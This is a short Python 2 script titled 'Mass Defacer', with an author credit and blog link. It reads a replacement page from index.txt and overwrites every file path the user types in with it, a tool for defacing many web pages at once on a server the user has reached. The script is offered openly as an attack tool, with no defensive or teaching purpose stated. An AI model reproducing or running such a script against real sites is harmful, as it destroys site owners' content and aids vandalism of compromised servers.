#!/usr/bin/python
#
# Coded By Twi John
#
# http://www.twijohn.blogspot.com/

import sys

ln = "." * 50
msg = "Mass Defacer - Coded By Twi John"
 
print (msg.center(50))
print ln

try:
 arqi = open("index.txt","r")
 index = arqi.read()
except IOError:
	print "\nError: Failed to open file"
	sys.exit(0)

v = False
lst = []
nu = 0
while v != True:
   e = raw_input("Enter address: ")

   if e == "ok":
      v = True
      n = len(lst)   
      for arg in range(n):
         try:         
            fe = open(lst[nu],"w")
            fe.write(index)
            fe.close()
            nu = nu + 1
         except IOError:
            print ("Erro: " + lst[nu])
            pass
   lst.append(e)
